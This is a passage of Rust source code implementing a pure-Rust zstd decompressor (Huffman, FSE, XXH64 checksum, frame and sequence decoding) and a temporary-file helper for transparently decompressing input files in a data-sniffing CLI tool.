    fn predefined_ll_table() -> FseTable {
        fse_build_table(6, &LL_DEFAULT_DISTRIBUTION)
            .expect("the predefined literals-length distribution is always valid")
    }
    fn predefined_ml_table() -> FseTable {
        fse_build_table(6, &ML_DEFAULT_DISTRIBUTION)
            .expect("the predefined match-length distribution is always valid")
    }
    fn predefined_of_table() -> FseTable {
        fse_build_table(5, &OF_DEFAULT_DISTRIBUTION)
            .expect("the predefined offset distribution is always valid")
    }

    // RFC 8878 Table 16: Literals_Length_Code -> (Baseline, Number_of_Bits).
    const LL_BASE: [u32; 36] = [
        0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 20, 22, 24, 28, 32, 40, 48,
        64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536,
    ];
    const LL_EXTRA: [u8; 36] = [
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 3, 3, 4, 6, 7, 8, 9, 10,
        11, 12, 13, 14, 15, 16,
    ];
    // RFC 8878 Table 17: Match_Length_Code -> (Baseline, Number_of_Bits).
    const ML_BASE: [u32; 53] = [
        3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26,
        27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 39, 41, 43, 47, 51, 59, 67, 83, 99, 131, 259, 515,
        1027, 2051, 4099, 8195, 16387, 32771, 65539,
    ];
    const ML_EXTRA: [u8; 53] = [
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 1, 1, 1, 1, 2, 2, 3, 3, 4, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16,
    ];

    // ---------------------------------------------------------------
    // Huffman coding (RFC 8878 4.2)
    // ---------------------------------------------------------------

    struct HuffmanTable {
        max_bits: u32,
        // Flat 2^max_bits table: entry[i] = (symbol, code_len) for the
        // codeword whose top bits equal i.
        entries: Vec<(u8, u8)>,
    }

    impl HuffmanTable {
        /// Parses a Huffman_Tree_Description (RFC 8878 4.2.1) and builds a
        /// flat lookup table.
        fn parse(data: &[u8]) -> Result<(Self, usize)> {
            let header = *data.first().context("empty Huffman tree description")?;
            let (mut weights, consumed): (Vec<u8>, usize) = if header >= 128 {
                let n_symbols = (header - 127) as usize;
                let n_bytes = n_symbols.div_ceil(2);
                let packed = data
                    .get(1..1 + n_bytes)
                    .context("truncated direct-encoded Huffman weights")?;
                let mut w = Vec::with_capacity(n_symbols);
                for &b in packed {
                    w.push(b >> 4);
                    w.push(b & 0xF);
                }
                w.truncate(n_symbols);
                (w, 1 + n_bytes)
            } else {
                let fse_len = header as usize;
                let fse_bytes = data
                    .get(1..1 + fse_len)
                    .context("truncated FSE-compressed Huffman weights")?;
                let mut fwd = ForwardBitReader::new(fse_bytes);
                let table = fse_table_from_description(&mut fwd, 255)?;
                let table_bytes = fwd.bytes_consumed();
                let stream = fse_bytes.get(table_bytes..).context(
                    "FSE-compressed Huffman weights: table description overran its own size",
                )?;
                let mut back = BackwardBitReader::new(stream)?;
                let w = fse_decode_interleaved(&mut back, &table, 255)?;
                (w, 1 + fse_len)
            };

            if weights.is_empty() {
                bail!("malformed zstd Huffman table: no weights decoded");
            }
            let weight_total: u32 = weights
                .iter()
                .map(|&w| if w == 0 { 0 } else { 1u32 << (w - 1) })
                .sum();
            if weight_total == 0 {
                bail!("malformed zstd Huffman table: all-zero weights");
            }
            let max_bits = 32 - (weight_total - 1).leading_zeros();
            let rest = (1u32 << max_bits) - weight_total;
            if rest == 0 || (rest & (rest - 1)) != 0 {
                bail!("malformed zstd Huffman table: implied last weight isn't a clean power of 2");
            }
            let last_weight = 32 - rest.leading_zeros(); // = log2(rest) + 1
            weights.push(last_weight as u8);

            if max_bits > 11 {
                bail!("malformed zstd Huffman table: max code length {max_bits} exceeds 11");
            }

            // Sort by weight ascending (stable, so natural order breaks ties),
            // drop weight-0 symbols, assign canonical codes starting from the
            // lowest weight (longest code) per RFC 8878 4.2.1.3.
            let mut order: Vec<usize> = (0..weights.len()).filter(|&i| weights[i] != 0).collect();
            order.sort_by_key(|&i| weights[i]);

            let mut entries = vec![(0u8, 0u8); 1usize << max_bits];
            let mut code: u32 = 0;
            let mut prev_len: u32 = max_bits + 1 - weights[order[0]] as u32;
            for &sym in &order {
                let len = max_bits + 1 - weights[sym] as u32;
                if len < prev_len {
                    code >>= prev_len - len;
                }
                let width = 1usize << (max_bits - len);
                let start = (code as usize) << (max_bits - len);
                for slot in entries.iter_mut().skip(start).take(width) {
                    *slot = (sym as u8, len as u8);
                }
                code += 1;
                prev_len = len;
            }

            Ok((HuffmanTable { max_bits, entries }, consumed))
        }

        fn decode_one(&self, reader: &mut BackwardBitReader) -> (u8, u8) {
            let idx = reader.peek_padded(self.max_bits) as usize;
            let (symbol, len) = self.entries[idx];
            reader.consume(len as u32);
            (symbol, len)
        }
    }

    /// Decodes a single Huffman-coded stream to exactly `regen_size`
    /// bytes.
    fn huffman_decode_stream(
        data: &[u8],
        table: &HuffmanTable,
        regen_size: usize,
    ) -> Result<Vec<u8>> {
        let mut reader = BackwardBitReader::new(data)?;
        let mut out = Vec::with_capacity(regen_size);
        for _ in 0..regen_size {
            let (symbol, _) = table.decode_one(&mut reader);
            out.push(symbol);
        }
        Ok(out)
    }

    // ---------------------------------------------------------------
    // XXH64 (for the optional Content_Checksum) - a stable, widely
    // reproduced algorithm; verified below against several known
    // reference digests (the empty string and short ASCII inputs, whose
    // XXH64 values are widely published and cross-checked here against
    // this project's own implementation before being trusted for real
    // frame verification).
    // ---------------------------------------------------------------

    const XXH_PRIME64_1: u64 = 0x9E3779B185EBCA87;
    const XXH_PRIME64_2: u64 = 0xC2B2AE3D27D4EB4F;
    const XXH_PRIME64_3: u64 = 0x165667B19E3779F9;
    const XXH_PRIME64_4: u64 = 0x85EBCA77C2B2AE63;
    const XXH_PRIME64_5: u64 = 0x27D4EB2F165667C5;

    fn xxh64_round(acc: u64, input: u64) -> u64 {
        acc.wrapping_add(input.wrapping_mul(XXH_PRIME64_2))
            .rotate_left(31)
            .wrapping_mul(XXH_PRIME64_1)
    }

    fn xxh64_merge_round(acc: u64, val: u64) -> u64 {
        let val = xxh64_round(0, val);
        (acc ^ val)
            .wrapping_mul(XXH_PRIME64_1)
            .wrapping_add(XXH_PRIME64_4)
    }

    fn xxh64_avalanche(mut h: u64) -> u64 {
        h ^= h >> 33;
        h = h.wrapping_mul(XXH_PRIME64_2);
        h ^= h >> 29;
        h = h.wrapping_mul(XXH_PRIME64_3);
        h ^= h >> 32;
        h
    }

    fn xxh64(data: &[u8], seed: u64) -> u64 {
        let len = data.len();
        let mut pos = 0usize;
        let mut h: u64;

        if len >= 32 {
            let mut v1 = seed.wrapping_add(XXH_PRIME64_1).wrapping_add(XXH_PRIME64_2);
            let mut v2 = seed.wrapping_add(XXH_PRIME64_2);
            let mut v3 = seed;
            let mut v4 = seed.wrapping_sub(XXH_PRIME64_1);
            while pos + 32 <= len {
                v1 = xxh64_round(
                    v1,
                    u64::from_le_bytes(data[pos..pos + 8].try_into().unwrap()),
                );
                pos += 8;
                v2 = xxh64_round(
                    v2,
                    u64::from_le_bytes(data[pos..pos + 8].try_into().unwrap()),
                );
                pos += 8;
                v3 = xxh64_round(
                    v3,
                    u64::from_le_bytes(data[pos..pos + 8].try_into().unwrap()),
                );
                pos += 8;
                v4 = xxh64_round(
                    v4,
                    u64::from_le_bytes(data[pos..pos + 8].try_into().unwrap()),
                );
                pos += 8;
            }
            h = v1
                .rotate_left(1)
                .wrapping_add(v2.rotate_left(7))
                .wrapping_add(v3.rotate_left(12))
                .wrapping_add(v4.rotate_left(18));
            h = xxh64_merge_round(h, v1);
            h = xxh64_merge_round(h, v2);
            h = xxh64_merge_round(h, v3);
            h = xxh64_merge_round(h, v4);
        } else {
            h = seed.wrapping_add(XXH_PRIME64_5);
        }

        h = h.wrapping_add(len as u64);

        while pos + 8 <= len {
            let k1 = xxh64_round(
                0,
                u64::from_le_bytes(data[pos..pos + 8].try_into().unwrap()),
            );
            h ^= k1;
            h = h
                .rotate_left(27)
                .wrapping_mul(XXH_PRIME64_1)
                .wrapping_add(XXH_PRIME64_4);
            pos += 8;
        }
        if pos + 4 <= len {
            let k1 = u32::from_le_bytes(data[pos..pos + 4].try_into().unwrap()) as u64;
            h ^= k1.wrapping_mul(XXH_PRIME64_1);
            h = h
                .rotate_left(23)
                .wrapping_mul(XXH_PRIME64_2)
                .wrapping_add(XXH_PRIME64_3);
            pos += 4;
        }
        while pos < len {
            h ^= (data[pos] as u64).wrapping_mul(XXH_PRIME64_5);
            h = h.rotate_left(11).wrapping_mul(XXH_PRIME64_1);
            pos += 1;
        }

        xxh64_avalanche(h)
    }

    // ---------------------------------------------------------------
    // Frame / block / literals / sequences
    // ---------------------------------------------------------------

    /// Which of the three per-sequence symbol types a table belongs to -
    /// each has its own max symbol value, max accuracy log, predefined
    /// distribution, and (for Repeat_Mode) its own carried-over table.
    #[derive(Clone, Copy)]
    enum SeqKind {
        Ll,
        Of,
        Ml,
    }

    impl SeqKind {
        fn max_symbol(self) -> u32 {
            match self {
                SeqKind::Ll => 35,
                SeqKind::Of => 31,
                SeqKind::Ml => 52,
            }
        }
        fn max_accuracy_log(self) -> u32 {
            match self {
                SeqKind::Ll | SeqKind::Ml => 9,
                SeqKind::Of => 8,
            }
        }
        fn predefined(self) -> FseTable {
            match self {
                SeqKind::Ll => predefined_ll_table(),
                SeqKind::Of => predefined_of_table(),
                SeqKind::Ml => predefined_ml_table(),
            }
        }
        fn name(self) -> &'static str {
            match self {
                SeqKind::Ll => "literals-length",
                SeqKind::Of => "offset",
                SeqKind::Ml => "match-length",
            }
        }
    }

    /// A single-state, always-resolves-to-the-same-symbol table for
    /// RLE_Mode - `table_log` 0 (matching zstd's own
    /// `ZSTD_buildSeqTable_rle`: `cell.nbBits = 0, cell.nextState = 0`, so
    /// the FSE state never advances) with the FSE-internal fields inert;
    /// the caller still separately looks up the symbol's own baseline/
    /// extra-bits (`LL_BASE`/`ML_BASE`/the offset-code formula) exactly as
    /// it would for any other mode.
    fn rle_table(symbol: u8) -> FseTable {
        FseTable {
            table_log: 0,
            entries: vec![FseEntry {
                symbol,
                nb_bits: 0,
                baseline: 0,
            }],
        }
    }

    struct Decoder {
        window: Vec<u8>,
        huffman: Option<HuffmanTable>,
        ll_table: Option<FseTable>,
        of_table: Option<FseTable>,
        ml_table: Option<FseTable>,
        rep: [u64; 3],
    }

    impl Decoder {
        fn new() -> Self {
            Decoder {
                window: Vec::new(),
                huffman: None,
                ll_table: None,
                of_table: None,
                ml_table: None,
                rep: [1, 4, 8],
            }
        }

        fn decode_frame(&mut self, data: &[u8]) -> Result<usize> {
            let mut pos = 0usize;
            let read_u = |data: &[u8], pos: usize, n: usize| -> Result<u64> {
                let bytes = data
                    .get(pos..pos + n)
                    .context("truncated zstd frame header")?;
                let mut v = 0u64;
                for (i, &b) in bytes.iter().enumerate() {
                    v |= (b as u64) << (8 * i);
                }
                Ok(v)
            };

            let fhd = *data.get(pos).context("truncated zstd frame header")?;
            pos += 1;
            let fcs_flag = fhd >> 6;
            let single_segment = (fhd & 0x20) != 0;
            let content_checksum = (fhd & 0x04) != 0;
            let dict_id_flag = fhd & 0x3;
            if fhd & 0x08 != 0 {
                bail!("unsupported zstd frame: reserved header bit is set");
            }

            if !single_segment {
                pos += 1; // Window_Descriptor - only needed to size an allocation, irrelevant here
                if pos > data.len() {
                    bail!("truncated zstd frame header (window descriptor)");
                }
            }

            let did_len = match dict_id_flag {
                0 => 0,
                1 => 1,
                2 => 2,
                3 => 4,
                _ => unreachable!(),
            };
            if did_len > 0 {
                let did = read_u(data, pos, did_len)?;
                if did != 0 {
                    bail!(
                        "zstd frame requires dictionary {did} - dictionary support isn't implemented"
                    );
                }
                pos += did_len;
            }

            let fcs_len: usize = match fcs_flag {
                0 => {
                    if single_segment {
                        1
                    } else {
                        0
                    }
                }
                1 => 2,
                2 => 4,
                3 => 8,
                _ => unreachable!(),
            };
            let content_size = if fcs_len > 0 {
                let raw = read_u(data, pos, fcs_len)?;
                pos += fcs_len;
                Some(if fcs_len == 2 { raw + 256 } else { raw })
            } else {
                None
            };
            if let Some(size) = content_size {
                self.window.reserve(size as usize);
            }

            self.huffman = None;
            self.ll_table = None;
            self.of_table = None;
            self.ml_table = None;
            self.rep = [1, 4, 8];

            loop {
                let header = data
                    .get(pos..pos + 3)
                    .context("truncated zstd block header")?;
                let raw = header[0] as u32 | (header[1] as u32) << 8 | (header[2] as u32) << 16;
                pos += 3;
                let last_block = raw & 1 != 0;
                let block_type = (raw >> 1) & 0x3;
                let block_size = (raw >> 3) as usize;

                match block_type {
                    0 => {
                        let content = data
                            .get(pos..pos + block_size)
                            .context("truncated zstd raw block")?;
                        self.window.extend_from_slice(content);
                        pos += block_size;
                    }
                    1 => {
                        let byte = *data.get(pos).context("truncated zstd RLE block")?;
                        pos += 1;
                        self.window.resize(self.window.len() + block_size, byte);
                    }
                    2 => {
                        let content = data
                            .get(pos..pos + block_size)
                            .context("truncated zstd compressed block")?;
                        self.decode_compressed_block(content)?;
                        pos += block_size;
                    }
                    _ => bail!("unsupported zstd block: reserved block type"),
                }

                if last_block {
                    break;
                }
            }

            if content_checksum {
                let stored = read_u(data, pos, 4)? as u32;
                pos += 4;
                let computed = xxh64(&self.window, 0) as u32;
                if computed != stored {
                    bail!(
                        "zstd content checksum mismatch: expected {stored:#x}, computed {computed:#x}"
                    );
                }
            }

            Ok(pos)
        }

        fn decode_compressed_block(&mut self, data: &[u8]) -> Result<()> {
            let (literals, seq_start) = self.decode_literals_section(data)?;
            self.decode_sequences_section(&data[seq_start..], &literals)
        }

        fn decode_literals_section(&mut self, data: &[u8]) -> Result<(Vec<u8>, usize)> {
            let b0 = *data.first().context("empty zstd literals section")?;
            let block_type = b0 & 0x3;
            let size_format = (b0 >> 2) & 0x3;

            match block_type {
                0 | 1 => {
                    // Raw or RLE: 1-bit or 2-bit size format, 1/2/3-byte header.
                    let (regen, hdr_len) = if size_format & 1 == 0 {
                        ((b0 >> 3) as usize, 1)
                    } else if size_format == 1 {
                        let b1 = *data.get(1).context("truncated literals header")?;
                        (((b0 as usize) >> 4) | ((b1 as usize) << 4), 2)
                    } else {
                        let b1 = *data.get(1).context("truncated literals header")?;
                        let b2 = *data.get(2).context("truncated literals header")?;
                        (
                            ((b0 as usize) >> 4) | ((b1 as usize) << 4) | ((b2 as usize) << 12),
                            3,
                        )
                    };
                    if block_type == 0 {
                        let content = data
                            .get(hdr_len..hdr_len + regen)
                            .context("truncated raw literals block")?;
                        Ok((content.to_vec(), hdr_len + regen))
                    } else {
                        let byte = *data.get(hdr_len).context("truncated RLE literals block")?;
                        Ok((vec![byte; regen], hdr_len + 1))
                    }
                }
                2 | 3 => {
                    // Compressed / Treeless: always 2-bit size format, 3-5 byte header.
                    let (regen, csize, hdr_len, n_streams) = match size_format {
                        0 => {
                            let v = b0 as usize
                                | (*data.get(1).context("truncated literals header")? as usize)
                                    << 8
                                | (*data.get(2).context("truncated literals header")? as usize)
                                    << 16;
                            (((v >> 4) & 0x3FF), (v >> 14) & 0x3FF, 3, 1)
                        }
                        1 => {
                            let v = b0 as usize
                                | (*data.get(1).context("truncated literals header")? as usize)
                                    << 8
                                | (*data.get(2).context("truncated literals header")? as usize)
                                    << 16;
                            (((v >> 4) & 0x3FF), (v >> 14) & 0x3FF, 3, 4)
                        }
                        2 => {
                            let v = b0 as usize
                                | (*data.get(1).context("truncated literals header")? as usize)
                                    << 8
                                | (*data.get(2).context("truncated literals header")? as usize)
                                    << 16
                                | (*data.get(3).context("truncated literals header")? as usize)
                                    << 24;
                            (((v >> 4) & 0x3FFF), (v >> 18) & 0x3FFF, 4, 4)
                        }
                        3 => {
                            let v = b0 as u64
                                | (*data.get(1).context("truncated literals header")? as u64) << 8
                                | (*data.get(2).context("truncated literals header")? as u64) << 16
                                | (*data.get(3).context("truncated literals header")? as u64) << 24
                                | (*data.get(4).context("truncated literals header")? as u64) << 32;
                            (
                                ((v >> 4) & 0x3FFFF) as usize,
                                ((v >> 22) & 0x3FFFF) as usize,
                                5,
                                4,
                            )
                        }
                        _ => unreachable!(),
                    };

                    let body = data
                        .get(hdr_len..hdr_len + csize)
                        .context("truncated compressed/treeless literals block")?;

                    if block_type == 2 {
                        let (table, tree_len) = HuffmanTable::parse(body)?;
                        self.huffman = Some(table);
                        self.decode_huffman_streams(&body[tree_len..], regen, n_streams)
                            .map(|out| (out, hdr_len + csize))
                    } else {
                        // Take the table out (rather than cloning the
                        // potentially large flat decode table) to satisfy
                        // the borrow checker, then put it back.
                        let table = self
                            .huffman
                            .take()
                            .context("treeless literals block with no previous Huffman table")?;
                        let result =
                            Self::decode_huffman_streams_with(&table, body, regen, n_streams);
                        self.huffman = Some(table);
                        result.map(|out| (out, hdr_len + csize))
                    }
                }
                _ => unreachable!(),
            }
        }

        fn decode_huffman_streams(
            &self,
            body: &[u8],
            regen: usize,
            n_streams: usize,
        ) -> Result<Vec<u8>> {
            let table = self.huffman.as_ref().expect("just parsed");
            Self::decode_huffman_streams_with(table, body, regen, n_streams)
        }

        fn decode_huffman_streams_with(
            table: &HuffmanTable,
            body: &[u8],
            regen: usize,
            n_streams: usize,
        ) -> Result<Vec<u8>> {
            if n_streams == 1 {
                return huffman_decode_stream(body, table, regen);
            }

            let jump = body.get(0..6).context("truncated Huffman Jump_Table")?;
            let s1 = u16::from_le_bytes([jump[0], jump[1]]) as usize;
            let s2 = u16::from_le_bytes([jump[2], jump[3]]) as usize;
            let s3 = u16::from_le_bytes([jump[4], jump[5]]) as usize;
            let rest = &body[6..];
            let total = rest.len();
            if s1 + s2 + s3 > total {
                bail!("malformed zstd literals: Jump_Table stream sizes exceed the block");
            }
            let s4 = total - s1 - s2 - s3;

            let per_stream = regen.div_ceil(4);
            let last = regen - per_stream * 3;
            let sizes = [per_stream, per_stream, per_stream, last];

            let mut out = Vec::with_capacity(regen);
            let mut off = 0usize;
            for (clen, rlen) in [s1, s2, s3, s4].into_iter().zip(sizes) {
                let stream = rest
                    .get(off..off + clen)
                    .context("truncated Huffman stream")?;
                out.extend(huffman_decode_stream(stream, table, rlen)?);
                off += clen;
            }
            Ok(out)
        }

        fn decode_sequences_section(&mut self, data: &[u8], literals: &[u8]) -> Result<()> {
            let b0 = *data.first().context("empty zstd sequences section")?;
            let (n_seq, hdr_len): (u32, usize) = if b0 == 0 {
                (0, 1)
            } else if b0 < 128 {
                (b0 as u32, 1)
            } else if b0 < 255 {
                let b1 = *data.get(1).context("truncated Number_of_Sequences")?;
                (((b0 as u32 - 128) << 8) + b1 as u32, 2)
            } else {
                let b1 = *data.get(1).context("truncated Number_of_Sequences")?;
                let b2 = *data.get(2).context("truncated Number_of_Sequences")?;
                (b1 as u32 + ((b2 as u32) << 8) + 0x7F00, 3)
            };

            let mut lit_pos = 0usize;
            if n_seq == 0 {
                if hdr_len != data.len() {
                    bail!("malformed zstd sequences section: extraneous data after zero sequences");
                }
                self.window.extend_from_slice(literals);
                return Ok(());
            }

            let modes = *data
                .get(hdr_len)
                .context("truncated Symbol_Compression_Modes")?;
            if modes & 0x3 != 0 {
                bail!("malformed zstd sequences section: reserved bits set");
            }
            let mut pos = hdr_len + 1;

            let ll_table =
                self.decode_seq_table(SeqKind::Ll, (modes >> 6) & 0x3, &data[pos..], &mut pos)?;
            let of_table =
                self.decode_seq_table(SeqKind::Of, (modes >> 4) & 0x3, &data[pos..], &mut pos)?;
            let ml_table =
                self.decode_seq_table(SeqKind::Ml, (modes >> 2) & 0x3, &data[pos..], &mut pos)?;

            self.ll_table = Some(clone_table(&ll_table));
            self.of_table = Some(clone_table(&of_table));
            self.ml_table = Some(clone_table(&ml_table));

            let stream = &data[pos..];
            let mut reader = BackwardBitReader::new(stream)?;

            // Initial state read order: LL, then OF, then ML.
            let mut ll_state = ll_table.init_state(&mut reader)?;
            let mut of_state = of_table.init_state(&mut reader)?;
            let mut ml_state = ml_table.init_state(&mut reader)?;

            for seq_idx in 0..n_seq {
                let ll_entry = ll_table.entries[ll_state];
                let of_entry = of_table.entries[of_state];
                let ml_entry = ml_table.entries[ml_state];

                // Value read order: offset code, then match length, then
                // literals length (RFC 8878 3.1.1.3.2.1.2). Each value's
                // own extra-bit count comes from that symbol's code
                // (LL_EXTRA/ML_EXTRA, or the offset code itself per RFC
                // 8878 3.1.1.3.2.1.1's `OF_bits[code] == code`) - entirely
                // separate from the FSE table's own state-transition
                // `nb_bits`/`baseline`, which is only used below to
                // advance to the *next* state.
                let of_code = of_entry.symbol as u32;
                let of_extra = reader.read(of_code)?;

                let ml_code = ml_entry.symbol as u32;
                let ml_extra_bits = *ML_EXTRA
                    .get(ml_code as usize)
                    .context("malformed zstd sequence: bad match-length code")?
                    as u32;
                let ml_extra = reader.read(ml_extra_bits)? as u64;
                let match_length = *ML_BASE
                    .get(ml_code as usize)
                    .expect("bounds already checked") as u64
                    + ml_extra;

                let ll_code = ll_entry.symbol as u32;
                let ll_extra_bits = *LL_EXTRA
                    .get(ll_code as usize)
                    .context("malformed zstd sequence: bad literals-length code")?
                    as u32;
                let ll_extra = reader.read(ll_extra_bits)? as u64;
                let lit_length = *LL_BASE
                    .get(ll_code as usize)
                    .expect("bounds already checked") as u64
                    + ll_extra;

                let offset = self.resolve_offset(of_code, of_extra, lit_length == 0)?;

                let lit_end = lit_pos + lit_length as usize;
                let lits = literals.get(lit_pos..lit_end).context(
                    "malformed zstd sequence: literals length exceeds the literals section",
                )?;
                self.window.extend_from_slice(lits);
                lit_pos = lit_end;

                if offset == 0 || offset as usize > self.window.len() {
                    bail!(
                        "malformed zstd sequence: back-reference offset {offset} is out of range"
                    );
                }
                let start = self.window.len() - offset as usize;
                self.window.reserve(match_length as usize);
                for i in 0..match_length as usize {
                    let b = self.window[start + i];
                    self.window.push(b);
                }

                let is_last = seq_idx + 1 == n_seq;
                if !is_last {
                    // State update order: LL, then ML, then OF.
                    ll_state =
                        ll_entry.baseline as usize + reader.read(ll_entry.nb_bits as u32)? as usize;
                    ml_state =
                        ml_entry.baseline as usize + reader.read(ml_entry.nb_bits as u32)? as usize;
                    of_state =
                        of_entry.baseline as usize + reader.read(of_entry.nb_bits as u32)? as usize;
                }
            }

            if reader.top != 0 {
                bail!("malformed zstd sequences section: bitstream not fully consumed");
            }
            if lit_pos < literals.len() {
                self.window.extend_from_slice(&literals[lit_pos..]);
            }

            Ok(())
        }

        /// Resolves one of the three per-sequence-symbol FSE tables (RFC
        /// 8878 3.1.1.3.2.1's Compression_Mode), advancing `pos` (an
        /// absolute offset into the *original* sequences-section buffer)
        /// past whatever this mode consumed there. `data` starts exactly
        /// at this table's own description.
        fn decode_seq_table(
            &self,
            kind: SeqKind,
            mode: u8,
            data: &[u8],
            pos: &mut usize,
        ) -> Result<FseTable> {
            match mode {
                0 => Ok(kind.predefined()),
                1 => {
                    let byte = *data
                        .first()
                        .context("truncated RLE sequence-table symbol")?;
                    if byte as u32 > kind.max_symbol() {
                        bail!(
                            "malformed zstd {} RLE table: symbol {byte} exceeds the maximum of {}",
                            kind.name(),
                            kind.max_symbol()
                        );
                    }
                    *pos += 1;
                    Ok(rle_table(byte))
                }
                2 => {
                    let mut fwd = ForwardBitReader::new(data);
                    let (table_log, counts) = fse_read_ncount(&mut fwd, kind.max_symbol())?;
                    if table_log > kind.max_accuracy_log() {
                        bail!(
                            "malformed zstd {} FSE table: accuracy log {table_log} exceeds the maximum of {}",
                            kind.name(),
                            kind.max_accuracy_log()
                        );
                    }
                    *pos += fwd.bytes_consumed();
                    fse_build_table(table_log, &counts)
                }
                3 => {
                    let existing = match kind {
                        SeqKind::Ll => &self.ll_table,
                        SeqKind::Of => &self.of_table,
                        SeqKind::Ml => &self.ml_table,
                    };
                    let table = existing.as_ref().with_context(|| {
                        format!(
                            "Repeat_Mode used for the {} table with no previous table to repeat",
                            kind.name()
                        )
                    })?;
                    Ok(clone_table(table))
                }
                _ => unreachable!("2-bit field"),
            }
        }

        fn resolve_offset(&mut self, code: u32, extra: u32, ll_zero: bool) -> Result<u64> {
            if code > 1 {
                let offset = ((1u64 << code) - 3) + extra as u64;
                self.rep[2] = self.rep[1];
                self.rep[1] = self.rep[0];
                self.rep[0] = offset;
                Ok(offset)
            } else if code == 0 {
                let idx = if ll_zero { 1 } else { 0 };
                let offset = self.rep[idx];
                let old0 = self.rep[0];
                self.rep[1] = if ll_zero { old0 } else { self.rep[1] };
                self.rep[0] = offset;
                Ok(offset)
            } else {
                let ll0 = ll_zero as u32;
                let sel = 1 + ll0 + extra;
                let temp = if sel == 3 {
                    self.rep[0].saturating_sub(1)
                } else {
                    self.rep[sel as usize]
                };
                if temp == 0 {
                    bail!("malformed zstd sequence: resolved repeat-offset is zero");
                }
                if sel != 1 {
                    self.rep[2] = self.rep[1];
                }
                self.rep[1] = self.rep[0];
                self.rep[0] = temp;
                Ok(temp)
            }
        }
    }

    fn clone_table(t: &FseTable) -> FseTable {
        FseTable {
            table_log: t.table_log,
            entries: t.entries.clone(),
        }
    }

    /// Top-level entry point, matching `gzip_decompress`'s exact shape:
    /// decodes every frame in `input` (concatenated frames and skippable
    /// frames, both legal per RFC 8878 3.1/3.1.2) to the full decompressed
    /// byte stream.
    pub(crate) fn zstd_decompress<R: std::io::Read>(mut input: R) -> Result<Vec<u8>> {
        let mut all = Vec::new();
        input
            .read_to_end(&mut all)
            .context("failed to read zstd input")?;

        if all.is_empty() {
            // Matches the real zstd CLI's own behavior on a genuinely
            // zero-byte ".zst" file ("unexpected end of file") rather than
            // silently treating it as valid empty content - a 0-byte file
            // is missing even the mandatory 4-byte magic number.
            bail!("not a valid zstd file (empty input)");
        }
        let mut out = Vec::new();
        let mut pos = 0usize;
        while pos < all.len() {
            let magic = all
                .get(pos..pos + 4)
                .context("truncated zstd frame magic number")?;
            let magic = u32::from_le_bytes(magic.try_into().unwrap());
            if (0x184D2A50..=0x184D2A5F).contains(&magic) {
                let size_bytes = all
                    .get(pos + 4..pos + 8)
                    .context("truncated skippable-frame size")?;
                let size = u32::from_le_bytes(size_bytes.try_into().unwrap()) as usize;
                pos += 8 + size;
                continue;
            }
            if magic != 0xFD2FB528 {
                bail!("not a valid zstd file (bad magic number {magic:#x})");
            }
            pos += 4;
            let mut decoder = Decoder::new();
            let before = decoder.window.len();
            let consumed = decoder.decode_frame(&all[pos..])?;
            pos += consumed;
            out.extend_from_slice(&decoder.window[before..]);
        }
        Ok(out)
    }
} // mod zstd_support

// --- Transparent gzip/zstd decompression ---
// Not a format of its own - a preprocessing step in front of every reader
// above. Every reader just opens a plain file path, so materializing
// compressed input to a real temporary file (rather than trying to hand
// each reader a generic Read stream) means compressed input needs zero
// per-format changes, including formats that need actual random file
// access rather than a stream (Parquet, SQLite, Excel). gzip (hand-rolled
// above, pure std, no dependency at all) is always available; zstd needs
// --features zstd since the zstd crate compiles a small vendored C library.

enum Compression {
    Gzip,
    Zstd,
}

fn compression_from_extension(path: &Path) -> Option<Compression> {
    match path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_lowercase()
        .as_str()
    {
        "gz" | "gzip" => Some(Compression::Gzip),
        "zst" | "zstd" => Some(Compression::Zstd),
        _ => None,
    }
}

#[cfg(feature = "zstd")]
fn decompress_zstd(input: std::fs::File, path: &Path) -> Result<Vec<u8>> {
    zstd_support::zstd_decompress(input).with_context(|| format!("failed to decompress {path:?}"))
}

#[cfg(not(feature = "zstd"))]
fn decompress_zstd(_input: std::fs::File, path: &Path) -> Result<Vec<u8>> {
    bail!(
        "zstd support isn't compiled in - rebuild with `cargo build --release --features zstd` (or --features full) to read {path:?}"
    )
}

/// A minimal hand-rolled stand-in for `tempfile::NamedTempFile`, just
/// large enough for what this project actually needs: a real on-disk file
/// (several readers here need genuine random file access, not just a
/// stream - Parquet, SQLite, Excel) that's cleaned up automatically when
/// dropped. Uses `create_new` - fails if the path already exists rather
/// than silently truncating or following it - for the same collision/
/// symlink-race safety `tempfile` provides internally; a small bounded
/// retry loop stands in for the RNG-backed retry `tempfile` itself uses,
/// since a pid + nanosecond-timestamp + call-counter name is already
/// unique for all practical purposes in a single-process CLI like this.
struct TempFile {
    path: PathBuf,
    file: std::fs::File,
}

impl TempFile {
    fn new() -> Result<Self> {
        use std::fs::OpenOptions;
        use std::sync::atomic::{AtomicU64, Ordering};

        static COUNTER: AtomicU64 = AtomicU64::new(0);
        let dir = std::env::temp_dir();
        let pid = std::process::id();

        for _ in 0..8 {
            let nanos = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0);
            let n = COUNTER.fetch_add(1, Ordering::Relaxed);
            let path = dir.join(format!("sniff-rs-{pid}-{nanos}-{n}.tmp"));
            match OpenOptions::new()
                .read(true)
                .write(true)
                .create_new(true)
                .open(&path)
            {
                Ok(file) => return Ok(TempFile { path, file }),
                Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => continue,
                Err(e) => {
                    return Err(e).context("failed to create a temporary file for decompression");
                }
            }
        }
        bail!("failed to create a temporary file for decompression after several attempts")
    }

    fn path(&self) -> &Path {
        &self.path
    }

    fn as_file_mut(&mut self) -> &mut std::fs::File {
        &mut self.file
    }
}

impl std::io::Write for TempFile {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        self.file.write(buf)
    }

